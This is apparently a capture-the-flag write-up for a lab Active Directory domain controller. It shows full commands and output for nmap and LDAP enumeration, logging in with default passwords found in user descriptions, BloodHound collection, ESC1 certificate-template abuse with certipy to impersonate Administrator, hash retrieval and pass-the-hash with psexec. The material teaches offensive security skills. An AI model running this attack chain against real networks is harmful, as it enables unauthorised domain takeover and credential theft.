## Summary:
+ Exploit an `Active Directory`

## Recon & Enumerate:
+ Scan all ports with `Nmap`:
```bash
$ nmap -sS -A -vv -T4 -p- labyrinth.thm.local
PORT      STATE    SERVICE       REASON          VERSION
53/tcp    open     domain        syn-ack ttl 125 Simple DNS Plus

80/tcp    open     http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
443/tcp   open     ssl/http      syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_ssl-date: 2025-08-27T18:00:48+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm

88/tcp    open     kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-08-27 17:59:27Z)

135/tcp   open     msrpc         syn-ack ttl 125 Microsoft Windows RPC

139/tcp   open     netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds? syn-ack ttl 125

464/tcp   open     kpasswd5?     syn-ack ttl 125
593/tcp   open     ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0

389/tcp   open     ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-27T18:00:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
636/tcp   open     ssl/ldap      syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
|_ssl-date: 2025-08-27T18:00:48+00:00; 0s from scanner time.
3268/tcp  open     ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-27T18:00:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
3269/tcp  open     ssl/ldap      syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
|_ssl-date: 2025-08-27T18:00:48+00:00; -1s from scanner time.

3389/tcp  open     ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Issuer: commonName=labyrinth.thm.local
|_ssl-date: 2025-08-27T18:00:48+00:00; 0s from scanner time.

5288/tcp  filtered unknown       no-response
9389/tcp  open     mc-nmf        syn-ack ttl 125 .NET Message Framing
37972/tcp filtered unknown       no-response
39384/tcp filtered unknown       no-response
47001/tcp open     http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open     ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
```

## Enumerate hidden directories:
+ Using `Gobuser` :
```bash
$ gobuster dir -u http://labyrinth.thm.local -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,js -t 50

/aspnet_client        (Status: 301) [Size: 158] [--> http://labyrinth.thm.local/aspnet_client/]
```

##  SMB(139,445):
+ No anonymous credential.
+ Access denied shares.

## LDAP(389,636,3268,3269):
+ Using `NetExec` to enumerate service:
```bash
nxc ldap labyrinth.thm.local --users
```

--> `Liss of users LDAP(thm.local)`

+ We've found 2 users  who didn't change old password:
```bash
IVY_WILLIS                    2023-05-30 19:30:55 0        Please change it: CHANGEME2023!
SUSANNA_MCKNIGHT              2023-07-05 22:11:32 0        Please change it: CHANGEME2023!
```

## RDP(3389):
+ Using 2 credentials login RDP:
```bash
xfreerdp3 /u:IVY_WILLIS /p:CHANGEME2023! /v:10.201.7.236
```
--> Login failed

```bash
xfreerdp3 /u:SUSANNA_MCKNIGHT /p:CHANGEME2023! /v:10.201.7.236
```

--> Login successfully and get the flag !

![alt text](<Pasted image 20250828160324.png>)

## BloodHound-Python (Collection):

```bash
$ bloodhound-python -u SUSANNA_MCKNIGHT -p CHANGEME2023! -d thm.local -ns 10.201.7.236 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: thm.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: labyrinth.thm.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: labyrinth.thm.local
INFO: Found 493 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 222 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: labyrinth.thm.local
INFO: Done in 08M 35S
INFO: Compressing output into 20250828160632_bloodhound.zip
```


## Privilege Escalation:
+ Using tool `certipy-ad` (Installed Default in Kali) to check AD CS for vulnerable certificate templates.
```bash
$ certipy-ad find -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -target <IP> -stdout -vulnerable 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'thm-LABYRINTH-CA' via RRP
[*] Successfully retrieved CA configuration for 'thm-LABYRINTH-CA'
[*] Checking web enrollment for CA 'thm-LABYRINTH-CA' @ 'labyrinth.thm.local'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : thm-LABYRINTH-CA
    DNS Name                            : labyrinth.thm.local
    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
    Certificate Serial Number           : 5225C02DD750EDB340E984BC75F09029
    Certificate Validity Start          : 2023-05-12 07:26:00+00:00
    Certificate Validity End            : 2028-05-12 07:35:59+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : THM.LOCAL\Administrators
      Access Rights
        ManageCa                        : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        ManageCertificates              : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Enroll                          : THM.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth
    Certificate Authorities             : thm-LABYRINTH-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-05-12T08:55:40+00:00
    Template Last Modified              : 2023-05-12T08:55:40+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Full Control Principals         : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Property Enroll           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : THM.LOCAL\Domain Computers
                                          THM.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

--> We found a **certificate template vulnerable to ESC1** on the “ServerAuth” template, which is both **enabled** and **user-enrollable by THM.LOCAL\Authenticated Users**.

The key details indicating this are:
- **Enrollee Supplies Subject:** True (“EnrolleeSuppliesSubject”).
- **Extended Key Usage includes Client Authentication**.
- **Enrollment Rights for Authenticated Users**.
- Template is **enabled**.
- Permissions allow **low-privileged users (Authenticated Users)** to request certificates.

+ We  can **request a certificate impersonating any domain user** (including privileged accounts) by specifying their username in the certificate request
 ```bash
 $ certipy-ad req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -ca thm-LABYRINTH-CA -target <IP> -template ServerAuth -upn Administrator@thm.local
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 25
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@thm.local'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
 ```

+ Using `certipy` to authenticate as `Administrator` and retrieve the NTLM hash:
```bash
$ certipy-ad auth -pfx administrator.pfx -dc-ip <IP>
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ADMINISTRATOR@thm.local'
[*] Using principal: 'administrator@thm.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@thm.local': aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322
```

+ Using impacket scripts `psexec.py` or `smbexec.py` enable testers to execute commands on target systems with pass-the-hash (NTLM):
```bash
$ sudo psexec.py -k -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
```

***Note: Using flag -k (Use Kerberos authentication) when authenticate Hashes. ***

![alt text](<Pasted image 20250828211544.png>)

+ Get the flag root.txt
![alt text](<Pasted image 20250828211614.png>)
-----